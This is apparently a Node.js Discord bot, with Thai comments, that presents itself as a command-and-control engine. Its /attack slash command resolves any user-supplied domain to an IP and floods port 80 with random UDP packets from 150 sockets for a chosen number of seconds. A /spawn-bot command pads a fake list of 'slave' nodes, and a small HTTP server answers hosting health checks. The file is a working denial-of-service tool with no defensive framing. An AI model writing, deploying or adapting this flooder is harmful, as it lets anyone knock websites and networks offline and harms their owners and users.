const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns').promises;

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

// HTTP Server สำหรับ Railway Health Check
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('JARVIS Auto-Resolve Titanium C2 Engine is online.');
});

server.listen(PORT, () => console.log(`[+] Auto-Resolve C2 Server running on port ${PORT}`));

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

client.once('ready', async () => {
    console.log(`[+] Auto-Resolve Bot logged in as ${client.user.tag}`);
    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('พิมพ์แค่ชื่อเว็บหรือ URL แล้วถล่มทันทีอัตโนมัติ!')
            .addStringOption(opt => opt.setName('target').setDescription('ชื่อเว็บหรือ URL เป้าหมาย (เช่น https://example.com)').setRequired(true))
            .addIntegerOption(opt => opt.setName('duration').setDescription('ระยะเวลาในการยิง (วินาที)').setRequired(true)),
        new SlashCommandBuilder()
            .setName('spawn-bot')
            .setDescription('เสกกองกำลังจำลอง')
            .addIntegerOption(opt => opt.setName('count').setDescription('จำนวน').setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('ตรวจสอบสถานะกองกำลัง')
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('[+] Auto-Resolve Slash commands registered.');
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] กองกำลังพร้อมรบ: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
    }

    if (interaction.commandName === 'spawn-bot') {
        const count = interaction.options.getInteger('count');
        for (let i = 0; i < count; i++) slaveNodes.push({ id: Math.random().toString(36).substring(7) });
        return interaction.reply({ content: `[🤖⚡] เพิ่มกำลังพลสำเร็จ **${count} ยูนิต**! รวมทั้งหมด: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
    }

    if (interaction.commandName === 'attack') {
        const rawTarget = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        await interaction.reply(`[🔍] กำลังแกะรอยและแปลงโดเมนของ **${rawTarget}**...`);

        try {
            // สกัดเอาเฉพาะ Hostname ออกมาจาก URL (ไม่ว่าจะใส่ http:// หรือมาแบบโล้นๆ)
            let hostname = rawTarget;
            if (rawTarget.includes('://')) {
                hostname = new URL(rawTarget).hostname;
            } else {
                hostname = rawTarget.split('/')[0];
            }

            // แปลงชื่อโดเมนเป็น IP Address จริงๆ อัตโนมัติด้วย DNS Lookup
            const dnsResult = await dns.lookup(hostname);
            const targetIp = dnsResult.address;
            const targetPort = 80; // ตั้งค่าเริ่มต้นที่พอร์ตเว็บมาตรฐาน

            await interaction.editReply(`[🔥⚡] เป้าหมายเคลียร์! แปลง **${hostname}** เป็น IP: **${targetIp}** สำเร็จ! เริ่มถล่มเป็นเวลา **${duration} วินาที** ลุยโลด!`);

            let active = true;
            setTimeout(() => { active = false; }, duration * 1000);

            // สร้าง Buffer ขยะขนาด 1024 ไบต์สำหรับยิงอัดท่อเน็ต
            const payload = crypto.randomBytes(1024);
            const threads = 150; // เพิ่มเธรดให้หนาแน่นขึ้น

            for (let i = 0; i < threads; i++) {
                const socket = dgram.createSocket('udp4');
                
                const floodLoop = () => {
                    if (!active) {
                        socket.close();
                        return;
                    }
                    socket.send(payload, 0, payload.length, targetPort, targetIp, (err) => {
                        setImmediate(floodLoop);
                    });
                };

                floodLoop();
            }

        } catch (error) {
            await interaction.editReply(`[❌] เกิดข้อผิดพลาดในการแปลงโดเมนหรือเชื่อมต่อเป้าหมาย: ${error.message}`);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
